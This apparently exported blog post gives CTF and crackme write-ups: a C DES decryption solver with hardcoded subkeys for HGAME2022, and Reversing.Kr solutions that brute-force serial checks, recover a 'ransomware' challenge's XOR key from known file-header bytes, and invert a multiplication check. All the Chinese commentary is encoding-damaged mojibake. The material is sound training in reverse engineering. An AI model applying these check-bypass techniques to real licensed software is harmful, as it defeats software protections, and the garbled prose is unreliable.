Num); void TablePermute(bool *DatOut,bool *DatIn,const char *Table,int Num); void LoopMove(bool *DatIn,int Len,int Num); void Xor(bool *DatA,bool *DatB,int Num); void S_Change(bool DatOut[32],bool DatIn[48]); void F_Change(bool DatIn[32],bool DatKi[48]); void SetKey(char KeyIn[8]); void PlayDes(char MesOut[8],char MesIn[8]); void KickDes(char MesOut[8],char MesIn[8]); int main() { char MesHex[64]={\u0026#34;92028926CF6497655A09A46F3A079DB14320B10556683353BB5AF969BBB23EA2\u0026#34;}; // 16ä¸ªå­—ç¬¦æ•°ç»„ç”¨äºå­˜æ”¾ 64ä½16è¿›åˆ¶çš„å¯†æ–‡ char MyMessage[32]={0}; KickDes(MyMessage,MesHex); KickDes(MyMessage+8,MesHex+16); KickDes(MyMessage+16,MesHex+32); KickDes(MyMessage+24,MesHex+48); printf(\u0026#34;Deciphering Over !!:\\n\u0026#34;); for(int i = 0; i \u0026lt; 32; i++) { printf(\u0026#34;%c\u0026#34;, MyMessage[i]); } printf(\u0026#34;\\n\u0026#34;); system(\u0026#34;pause\u0026#34;); } void BitsCopy(bool *DatOut,bool *DatIn,int Len) { for(int i=0; i \u0026lt; Len; i++) { DatOut[i] = DatIn[i]; } } void ByteToBit(bool *DatOut,char *DatIn,int Num) { for(int i = 0; i \u0026lt; Num; i++) { DatOut[i] = (DatIn[i / 8] \u0026gt;\u0026gt; (i % 8)) \u0026amp; 0x01; } } void BitToByte(char *DatOut,bool *DatIn,int Num) { for(int i = 0; i \u0026lt; (Num / 8); i++) { DatOut[i] = 0; } for(int i = 0; i \u0026lt; Num; i++) { DatOut[i / 8] |= DatIn[i] \u0026lt;\u0026lt; (i % 8); } } void BitToHex(char *DatOut,bool *DatIn,int Num) { int i; for(i = 0; i \u0026lt; Num / 4; i++) { DatOut[i] = 0; } for(i = 0; i \u0026lt; Num / 4; i++) { DatOut[i] = DatIn[i * 4] + (DatIn[i * 4 + 1] \u0026lt;\u0026lt; 1) + (DatIn[i * 4 + 2] \u0026lt;\u0026lt; 2) + (DatIn[i * 4 + 3] \u0026lt;\u0026lt; 3); if((DatOut[i] % 16) \u0026gt; 9) { DatOut[i] = DatOut[i] % 16 + \u0026#39;7\u0026#39;; } else { DatOut[i] = DatOut[i] % 16 + \u0026#39;0\u0026#39;; } } } void HexToBit(bool *DatOut,char *DatIn,int Num) { for(int i = 0; i \u0026lt; Num; i++) { if((DatIn[i / 4]) \u0026gt; \u0026#39;9\u0026#39;) { DatOut[i] = ((DatIn[i / 4] - \u0026#39;7\u0026#39;) \u0026gt;\u0026gt; (i % 4)) \u0026amp; 0x01; } else { DatOut[i] = ((DatIn[i / 4] - \u0026#39;0\u0026#39;) \u0026gt;\u0026gt; (i % 4)) \u0026amp; 0x01; } } } void TablePermute(bool *DatOut,bool *DatIn,const char *Table,int Num) { static bool Temp[256] = {0}; for(int i = 0; i \u0026lt; Num; i++) { Temp[i] = DatIn[Table[i] - 1]; } BitsCopy(DatOut, Temp, Num); } void LoopMove(bool *DatIn,int Len,int Num) { static bool Temp[256]={0}; BitsCopy(Temp,DatIn,Num); BitsCopy(DatIn,DatIn+Num,Len-Num); BitsCopy(DatIn+Len-Num,Temp,Num); } void Xor(bool *DatA,bool *DatB,int Num) { for(int i = 0; i \u0026lt; Num; i++) { DatA[i] = DatA[i] ^ DatB[i]; } } void S_Change(bool DatOut[32],bool DatIn[48]) { int i,X,Y; for(i = 0, Y = 0, X = 0; i \u0026lt; 8; i++, DatIn += 6, DatOut += 4) { Y=(DatIn[0] \u0026lt;\u0026lt; 1) + DatIn[5]; X=(DatIn[1] \u0026lt;\u0026lt; 3) + (DatIn[2] \u0026lt;\u0026lt; 2) + (DatIn[3] \u0026lt;\u0026lt; 1) + DatIn[4]; int v9 = S_Box[i][Y][X]; for(int j = 3; j \u0026gt;= 0; j--) { DatOut[j] = v9 % 2; v9 /= 2; } } } void F_Change(bool DatIn[32],bool DatKi[48]) { static bool MiR[48]={0}; TablePermute(MiR,DatIn,E_Table,48); Xor(MiR,DatKi,48); S_Change(DatIn,MiR); TablePermute(DatIn,DatIn,P_Table,32); } void SetKey(char KeyIn[8]) { static bool KeyBit[64] = {0}; static bool *KiL = \u0026amp;KeyBit[0], *KiR = \u0026amp;KeyBit[28]; ByteToBit(KeyBit, KeyIn, 64); TablePermute(KeyBit, KeyBit, PC1_Table, 56); for(int i = 0; i \u0026lt; 16; i++) { LoopMove(KiL, 28, Move_Table[i]); LoopMove(KiR, 28, Move_Table[i]); TablePermute(SubKey[i], KeyBit, PC2_Table, 48); } } void PlayDes(char MesOut[8],char MesIn[8]) { int i; static bool MesBit[64] = {0}; static bool Temp[32] = {0}; static bool *MiL = \u0026amp;MesBit[0], *MiR = \u0026amp;MesBit[32]; ByteToBit(MesBit, MesIn, 64); TablePermute(MesBit, MesBit, IP_Table, 64); for (i = 0; i \u0026lt; 64; i++) { printf(\u0026#34;%d \u0026#34;, MesBit[i]); } printf(\u0026#34;\\n\u0026#34;); for(i = 0; i \u0026lt; 16; i++) { BitsCopy(Temp, MiR, 32); F_Change(MiR, SubKey[i]); Xor(MiR, MiL, 32); BitsCopy(MiL, Temp, 32); for (int j = 0; j \u0026lt; 64; j++){ printf(\u0026#34;%d \u0026#34;, MesBit[j]); } printf(\u0026#34;\\n\u0026#34;); } for(i = 0; i \u0026lt; 32; i++) { int tmp = MesBit[i]; MesBit[i] = MesBit[i + 32]; MesBit[i + 32] = tmp; } TablePermute(MesBit, MesBit, IPR_Table, 64); for (i = 0; i \u0026lt; 64; i++){ printf(\u0026#34;%d \u0026#34;, MesBit[i]); } BitToHex(MesOut,MesBit,64); } void KickDes(char MesOut[8],char MesIn[8]) { int i; static bool MesBit[64] = {0}; static bool Temp[32] = {0}; static bool *MiL = \u0026amp;MesBit[0], *MiR = \u0026amp;MesBit[32]; HexToBit(MesBit, MesIn, 64); TablePermute(MesBit, MesBit, IP_Table, 64); for (i = 0; i \u0026lt; 32; i++) { int tmp = MesBit[i]; MesBit[i] = MesBit[i + 32]; MesBit[i + 32] = tmp; } for(i = 15; i \u0026gt;= 0; i--) { BitsCopy(Temp, MiL, 32); F_Change(MiL, SubKey[i]); Xor(MiL, MiR, 32); BitsCopy(MiR, Temp, 32); } TablePermute(MesBit, MesBit, IPR_Table, 64); for (i = 0; i \u0026lt; 64; i++){ printf(\u0026#34;%d \u0026#34;, MesBit[i]); } BitToByte(MesOut, MesBit, 64); } bool.hï¼Œæˆ‘çš„è¯„ä»·æ˜¯ä¸å¦‚ç›´æ¥ä¸Š c++\n#ifndef __BOOL_H__ #define __BOOL_H__ typedef enum { false = 0, true = 1 } bool; #endif tables.hï¼Œä¹‹å‰æ‰¾åˆ°çš„æ–‡ä»¶æœ‰å‡ å¤„ä¸é¢˜ç›®ä¸­ä¸åŒï¼Œä¸çŸ¥é“æ˜¯ä½œè€…å†™é”™äº†è¿˜æ˜¯é¢˜ç›®æ”¹æ•°äº†ï¼Œç›´æ¥æŠŠç®—å¥½çš„ subkey å¡«åˆ°è¿™é‡Œï¼Œå°±ä¸ç”¨å†è¾“å…¥å¯†é’¥ç®—äº†\n#ifndef _TABLES_H_ #define _TABLES_H_ const char IP_Table[64]={ 58,50,42,34,26,18,10, 2,60,52,44,36,28,20,12, 4, 62,54,46,38,30,22,14, 6,64,56,48,40,32,24,16, 8, 57,49,41,33,25,17, 9, 1,59,51,43,35,27,19,11, 3, 61,53,45,37,29,21,13, 5,63,55,47,39,31,23,15, 7 }; const char IPR_Table[64]={ 40, 8,48,16,56,24,64,32,39, 7,47,15,55,23,63,31, 38, 6,46,14,54,22,62,30,37, 5,45,13,53,21,61,29, 36, 4,44,12,52,20,60,28,35, 3,43,11,51,19,59,27, 34, 2,42,10,50,18,58,26,33, 1,41, 9,49,17,57,25\t}; static char E_Table[48]={ 32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9,10,11,12,13,12,13,14,15,16,17, 16,17,18,19,20,21,20,21,22,23,24,25, 24,25,26,27,28,29,28,29,30,31,32, 1 }; static char PC1_Table[56]={ 57,49,41,33,25,17, 9, 1,58,50,42,34,26,18, 10, 2,59,51,43,35,27,19,11, 3,60,52,44,36, 63,55,47,39,31,23,15, 7,62,54,46,38,30,22, 14, 6,61,53,45,37,29,21,13, 5,28,20,12, 4 }; static char Move_Table[16]={ 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 }; static char PC2_Table[48]={ 14,17,11,24, 1, 5, 3,28,15, 6,21,10, 23,19,12, 4,26, 8,16, 7,27,20,13, 2, 41,52,31,37,47,55,30,40,51,45,33,48, 44,49,39,56,34,53,46,42,50,36,29,32\t}; static char S_Box[8][4][16]={ //S1 14, 4,13, 1, 2,15,11, 8, 3,10, 6,12, 5, 9, 0, 7, 0,15, 7, 4,14, 2,13, 1,10, 6,12,11, 9, 5, 3, 8, 4, 1,14, 8,13, 6, 2,11,15,12, 9, 7, 3,10, 5, 0, 15,12, 8, 2, 4, 9, 1, 7, 5,11, 3,14,10, 0, 6,13, //S2 15, 1, 8,14, 6,11, 3, 4, 9, 7, 2,13,12, 0, 5,10, 3,13, 4, 7,15, 2, 8,14,12, 0, 1,10, 6, 9,11, 5, 0,14, 7,11,10, 4,13, 1, 5, 8,12, 6, 9, 3, 2,15, 13, 8,10, 1, 3,15, 4, 2,11, 6, 7,12, 0, 5,14, 9, //S3 10, 0, 9,14, 6, 3,15, 5, 1,13,12, 7,11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6,10, 2, 8, 5,14,12,11,15, 1, 13, 6, 4, 9, 8,15, 3, 0,11, 1, 2,12, 5,10,14, 7, 1,10,13, 0, 6, 9, 8, 7, 4,15,14, 3,11, 5, 2,12, //S4 7,13,14, 3, 0, 6, 9,10, 1, 2, 8, 5,11,12, 4,15, 13, 8,11, 5, 6,15, 0, 3, 4, 7, 2,12, 1,10,14, 9, 10, 6, 9, 0,12,11, 7,13,15, 1, 3,14, 5, 2, 8, 4, 3,15, 0, 6,10, 1,13, 8, 9, 4, 5,11,12, 7, 2,14, //S5 2,12, 4, 1, 7,10,11, 6, 8, 5, 3,15,13, 0,14, 9, 14,11, 2,12, 4, 7,13, 1, 5, 0,15,10, 3, 9, 8, 6, 4, 2, 1,11,10,13, 7, 8,15, 9,12, 5, 6, 3, 0,14, 11, 8,12, 7, 1,14, 2,13, 6,15, 0, 9,10, 4, 5, 3, //S6 12, 1,10,15, 9, 2, 6, 8, 0,13, 3, 4,14, 7, 5,11, 10,15, 4, 2, 7,12, 9, 5, 6, 1,13,14, 0,11, 3, 8, 9,14,15, 5, 2, 8,12, 3, 7, 0, 4,10, 1,13,11, 6, 4, 3, 2,12, 9, 5,15,10,11,14, 1, 7, 6, 0, 8,13, //S7 4,11, 2,14,15, 0, 8,13, 3,12, 9, 7, 5,10, 6, 1, 13, 0,11, 7, 4, 9, 1,10,14, 3, 5,12, 2,15, 8, 6, 1, 4,11,13,12, 3, 7,14,10,15, 6, 8, 0, 5, 9, 2, 6,11,13, 8, 1, 4,10, 7, 9, 5, 0,15,14, 2, 3,12, //S8 13, 2, 8, 4, 6,15,11, 1,10, 9, 3,14, 5, 0,12, 7, 1,15,13, 8,10, 3, 7, 4,12, 5, 6,11, 0,14, 9, 2, 7,11, 4, 1, 9,12,14, 2, 0, 6,10,13,15, 3, 5, 8, 2, 1,14, 7, 4,10, 8,13,15,12, 9, 0, 3, 5, 6,11 }; static char P_Table[32]={ 16, 7,20,21,29,12,28,17, 1,15,23,26, 5,18,31,10, 2, 8,24,14,32,27, 3, 9,19,13,30, 6,22,11, 4,25 }; static bool SubKey[16][48]={ 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0 }; #endif ","date":"2022-02-04T13:08:32+08:00","image":"/post/hgame2022-writeups/cover_hu135499abd96f0998ee1b80004657897f_2075706_120x120_fill_box_smart1_3.png","permalink":"/post/hgame2022-writeups/","title":"HGAME2022 writeups"},{"content":"CSHOP æŒ‰ä¸€ä¸‹å›è½¦å°±é€šå…³äº†\nå¦‚æœè¦æŸ¥çœ‹é€»è¾‘çš„è¯ï¼Œéœ€è¦å…ˆä½¿ç”¨ de4dot è„±å£³ï¼Œç„¶åç”¨ dnSpy æ‰“å¼€\nprivate void Form1_Load(object sender, EventArgs e) { this.lblSu.Text = \u0026#34; \u0026#34;; this.lblGu.Text = \u0026#34; \u0026#34;; this.lblNu.Text = \u0026#34; \u0026#34;; this.lblKu.Text = \u0026#34; \u0026#34;; this.lblZu.Text = \u0026#34; \u0026#34;; this.lblMu.Text = \u0026#34; \u0026#34;; this.lblTu.Text = \u0026#34; \u0026#34;; this.ppppp.Text = \u0026#34; \u0026#34;; this.lblGu.Text = \u0026#34; \u0026#34;; this.lblQu.Text = \u0026#34; \u0026#34;; this.ppppp.Text = \u0026#34; \u0026#34;; this.lblTu.Text = \u0026#34; \u0026#34;; this.lblXu.Text = \u0026#34; \u0026#34;; } // Token: 0x06000004 RID: 4 RVA: 0x000021B0 File Offset: 0x000003B0 private void btnStart_Click(object sender, EventArgs e) { this.lblSu.Text = \u0026#34;W\u0026#34;; this.lblGu.Text = \u0026#34;5\u0026#34;; this.lblNu.Text = \u0026#34;4\u0026#34;; this.lblKu.Text = \u0026#34;R\u0026#34;; this.lblZu.Text = \u0026#34;E\u0026#34;; this.lblMu.Text = \u0026#34;6\u0026#34;; this.lblTu.Text = \u0026#34;M\u0026#34;; this.ppppp.Text = \u0026#34;I\u0026#34;; this.lblGu.Text = \u0026#34;P\u0026#34;; this.lblQu.Text = \u0026#34;S\u0026#34;; this.ppppp.Text = \u0026#34;P\u0026#34;; this.lblTu.Text = \u0026#34;6\u0026#34;; this.lblXu.Text = \u0026#34;S\u0026#34;; } ä¸€å¼€å§‹çš„ Text è¢«è®¾ç½®ä¸ºäº†ç©ºæ ¼ï¼Œè€Œåœ¨ç‚¹å‡»äº†æŸä¸ªé”®ä¹‹åå°±ä¼šè®¾ç½®ä¸ºå…·ä½“çš„å€¼ï¼Œæ‰€ä»¥æŒ‰ä¸€ä¸‹å›è½¦å°±èƒ½çœ‹åˆ° flag\nPosition è¿™é“é¢˜æ˜¯ MFC é€†å‘\nåˆ©ç”¨ Right å’Œ Wrong å­—ç¬¦ä¸²æ‰¾åˆ°é€»è¾‘\nvoid __thiscall sub_401CD0(char *this) { int v2; // eax CWnd *v3; // ecx v2 = sub_401740((int)this); v3 = (CWnd *)(this + 188); if ( v2 ) CWnd::SetWindowTextW(v3, L\u0026#34;Correct!\u0026#34;); else CWnd::SetWindowTextW(v3, L\u0026#34;Wrong\u0026#34;); } sub_401740 å°±æ˜¯éªŒè¯é€»è¾‘\nCWnd::GetWindowTextW(a1 + 304, \u0026amp;v50); if ( *(_DWORD *)(v50 - 12) == 4 ) ç¬¬ä¸€æ­¥éªŒè¯è¾“å…¥é•¿åº¦æ˜¯å¦ä¸º 4\nv3 = 0; while ( (unsigned __int16)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, v3) \u0026gt;= 0x61u \u0026amp;\u0026amp; (unsigned __int16)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, v3) \u0026lt;= 0x7Au ) { if ( ++v3 \u0026gt;= 4 ) { LABEL_7: v4 = 0; while ( 1 ) { if ( v1 != v4 ) { v5 = ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, v4); if ( (unsigned __int16)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, v1) == v5 ) goto LABEL_2; } éšååˆ©ç”¨åŒé‡å¾ªç¯ï¼Œçº¦æŸè¾“å…¥ä¸ºå°å†™å­—æ¯å¹¶ä¸”æ²¡æœ‰é‡å¤\nCWnd::GetWindowTextW(a1 + 420, \u0026amp;v51); if ( *(_DWORD *)(v51 - 12) == 11 \u0026amp;\u0026amp; (unsigned __int16)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v51, 5) == 45 ) { v6 = ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, 0); v40 = (v6 \u0026amp; 1) + 5; v48 = ((v6 \u0026amp; 0x10) != 0) + 5; v42 = ((v6 \u0026amp; 2) != 0) + 5; v44 = ((v6 \u0026amp; 4) != 0) + 5; v46 = ((v6 \u0026amp; 8) != 0) + 5; v7 = ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v50, 1); v32 = (v7 \u0026amp; 1) + 1; v38 = ((v7 \u0026amp; 0x10) != 0) + 1; v34 = ((v7 \u0026amp; 2) != 0) + 1; v8 = ((v7 \u0026amp; 4) != 0) + 1; v36 = ((v7 \u0026amp; 8) != 0) + 1; Buffer = (wchar_t *)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetBuffer(v52); itow_s(v40 + v8, Buffer, 0xAu, 10); v10 = ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(v52, 0); if ( (unsigned __int16)ATL::CSimpleStringT\u0026lt;wchar_t,1\u0026gt;::GetAt(\u0026amp;v51, 0) == v10 ) ä¸Šé¢çš„ if è¯­å¥è¦æ±‚äº† serialï¼Œä¸‹é¢çš„ if è¦æ±‚äº† v40 + v8 éœ€è¦ç­‰äºè¾“å…¥çš„ç¬¬ä¸€ä½\nåŒæ ·çš„é€»è¾‘ï¼Œçº¦æŸäº† v46 + v36 ç­‰äºè¾“å…¥çš„ç¬¬äºŒä½\nç›´æ¥å†™ä¸ªè„šæœ¬çˆ†ç ´ä¸€ä¸‹\nfor v6 in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): for v7 in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): v40 = (v6 \u0026amp; 1) + 5 v48 = ((v6 \u0026amp; 0x10) != 0) + 5 v42 = ((v6 \u0026amp; 2) != 0) + 5 v44 = ((v6 \u0026amp; 4) != 0) + 5 v46 = ((v6 \u0026amp; 8) != 0) + 5 v32 = (v7 \u0026amp; 1) + 1 v38 = ((v7 \u0026amp; 0x10) != 0) + 1 v34 = ((v7 \u0026amp; 2) != 0) + 1 v8 = ((v7 \u0026amp; 4) != 0) + 1 v36 = ((v7 \u0026amp; 8) != 0) + 1 if (v40 + v8 == 7 and v46 + v36 == 6 and v42 + v38 == 8 and v44 + v32 == 7 and v48 + v34 == 6): print (chr(v6) + chr(v7)) # bu # cq # ft # gp print () for v19 in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): # for v20 in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): v20 = ord(\u0026#39;p\u0026#39;) v41 = (v19 \u0026amp; 1) + 5 v49 = ((v19 \u0026amp; 0x10) != 0) + 5 v43 = ((v19 \u0026amp; 2) != 0) + 5 v45 = ((v19 \u0026amp; 4) != 0) + 5 v47 = ((v19 \u0026amp; 8) != 0) + 5 v33 = (v20 \u0026amp; 1) + 1 v39 = ((v20 \u0026amp; 0x10) != 0) + 1 v35 = ((v20 \u0026amp; 2) != 0) + 1 v21 = ((v20 \u0026amp; 4) != 0) + 1 v37 = ((v20 \u0026amp; 8) != 0) + 1 if (v41 + v21 == 7 and v47 + v37 == 7 and v43 + v39 == 7 and v45 + v33 == 7 and v49 + v35 == 6): print (chr(v19) + chr(v20)) # mp æœ¬é¢˜å¤šè§£ï¼Œä½†å¹³å°å¥½åƒåªè®¤ bump\nRansomware è„±å£³ï¼Œç„¶åå‘ç°æœ‰å¤§é‡çš„æ— æ•ˆæŒ‡ä»¤\npush eax pop eax push ebx pop ebx pusha popa è¦æŸ¥çœ‹ main çš„é€»è¾‘ç›´æ¥æŠŠå¼€å¤´å‡ æ¡æŒ‡ä»¤ patch ä¸‹æ¥å°±è¡Œ\né‡æ–°ç”Ÿæˆä¸€ä¸ªå‡½æ•°å°±èƒ½çœ‹åˆ°åç¼–è¯‘ç»“æœäº†\næ ¹æ® readme å¯çŸ¥ï¼Œè¢«åŠ å¯†çš„æ˜¯ä¸€ä¸ª exe æ–‡ä»¶ï¼Œæ‰€ä»¥æŠŠ file çš„å‰åå…­ä¸ªå­—èŠ‚ä½œä¸ºæ˜æ–‡ï¼Œrun.exe çš„å‰åå…­ä¸ªå­—èŠ‚ä½œä¸ºå¯†æ–‡ï¼Œç®—ä¸€ä¸‹å¯†é’¥\na = \u0026#39;DE C0 1B 8C 8C 93 9E 86 98 97 9A 8C 73 6C 9A 8B\u0026#39;.split() a = [int(i, 16) for i in a] # a = [222, 192, 27, 140, 140, 147, 158, 134, 152, 151, 154, 140, 115, 108, 154, 139] p = \u0026#39;4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00\u0026#39;.split() p = [int(i, 16) for i in p] # p = [77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0] for i, j in zip(a, p): print (chr((~i \u0026amp; 0xff) ^ j), end=\u0026#39;\u0026#39;) # letsplaychesslet æ˜¾ç„¶ Key æ˜¯ letsplaychess\nè¿è¡Œä¸€ä¸‹å¾—åˆ°æ–°çš„ exeï¼Œè„±å£³åæ±‡ç¼–\nHateIntel æ ¹æ®å­—ç¬¦ä¸²æ‰¾åˆ°å…³é”®å‡½æ•°\næŸ¥çœ‹åŠ å¯†å‡½æ•°\næ€»å…± 4 è½®ï¼ŒåŠ å¯†æ˜¯å•å­—èŠ‚å¾ªç¯å·¦ç§» 4 ä½\nè§£å¯†\ncipher = [ 0x44, 0xF6, 0xF5, 0x57, 0xF5, 0xC6, 0x96, 0xB6, 0x56, 0xF5, 0x14, 0x25, 0xD4, 0xF5, 0x96, 0xE6, 0x37, 0x47, 0x27, 0x57, 0x36, 0x47, 0x96, 0x03, 0xE6, 0xF3, 0xA3, 0x92 ] def dec_byte(a, b): return ((a \u0026gt;\u0026gt; b) | (a \u0026lt;\u0026lt; (8 - b))) \u0026amp; 0xff for c in cipher: print (chr(dec_byte(c, 4)), end=\u0026#39;\u0026#39;) # Do_u_like_ARM_instructi0n?:) Multiplicative åç¼–è¯‘ç»“æœ\npublic class JavaCrackMe { public static final strictfp void main(String[] arg6) { Class v1 = JavaCrackMe.class; __monitor_enter(v1); try { System.out.println(\u0026#34;Reversing.Kr CrackMe!!\u0026#34;); System.out.println(\u0026#34;-----------------------------\u0026#34;); System.out.println(\u0026#34;The idea came out of the warsaw\\\u0026#39;s crackme\u0026#34;); System.out.println(\u0026#34;-----------------------------\\n\u0026#34;); if(((long)Long.decode(arg6[0])) * 0x6869L == -1536092243306511225L) { System.out.println(\u0026#34;Correct!\u0026#34;); } else { System.out.println(\u0026#34;Wrong\u0026#34;); } } catch(Exception v0_1) { try { System.out.println(\u0026#34;Please enter a 64bit signed int\u0026#34;); } catch(Throwable v0) { __monitor_exit(v1); throw v0; } } catch(Throwable v0) { __monitor_exit(v1); throw v0; } __monitor_exit(v1); } } å‚æ•°è¿›è¡Œä¹˜æ³•åç­‰äºæŸä¸ªæ•°å­—\nç”±äºå¹¶ä¸èƒ½æ•´é™¤ï¼Œæ‰€ä»¥è¿ç®—æœ‰æº¢å‡ºï¼Œä¸€ä¸ªæ–¹æ³•æ˜¯ç›´æ¥æ±‚é€†å…ƒï¼Œå¦ä¸€ç§æ–¹æ³•æ˜¯çˆ†ç ´æº¢å‡ºä½\næ–¹æ³•ä¸€ï¼š\nIn [3]: from libnum import * In [5]: tar = -1536092243306511225 \u0026amp; 0xffffffffffffffff In [8]: hex(tar * invmod(0x6869, 0x10000000000000000) % 0x10000000000000000) Out[8]: \u0026#39;0x83676f67696c676f\u0026#39; In [12]: (-0x83676f67696c676f) \u0026amp; 0xffffffffffffffff Out[12]: 8978084842198767761 In [13]: hex(8978084842198767761) Out[13]: \u0026#39;0x7c98909896939891\u0026#39; In [14]: hex(-8978084842198767761 \u0026amp; 0xffffffffffffffff) Out[14]: \u0026#39;0x83676f67696c676f\u0026#39; æ–¹æ³•äºŒï¼š\nIn [23]: i = 0 In [24]: while True: ...: if (0xeaaeb43e477b8487 + (i \u0026lt;\u0026lt; 64)) % 0x6869 == 0: ...: break ...: i += 1 ...: In [25]: i Out[25]: 13719 In [26]: hex((0xeaaeb43e477b8487 + (i \u0026lt;\u0026lt; 64)) // 0x6869) Out[26]: \u0026#39;0x83676f67696c676f\u0026#39; In [27]: -((0xeaaeb43e477b8487 + (i \u0026lt;\u0026lt; 64)) // 0x6869) \u0026amp; 0xffffffffffffffff Out[27]: 8978084842198767761 è¿è¡Œç»“æœ\n$ java -jar JavaCrackMe.jar -8978084842198767761 Reversing.Kr CrackMe!! ----------------------------- The idea came out of the warsaw\u0026#39;s crackme ----------------------------- Correct! LOTTO è¾“å…¥éœ€è¦é€šè¿‡çš„æ˜¯ä¸€ä¸ªéšæœºæ•°çš„é€»è¾‘\nç›´æ¥ä¿®æ”¹ ip 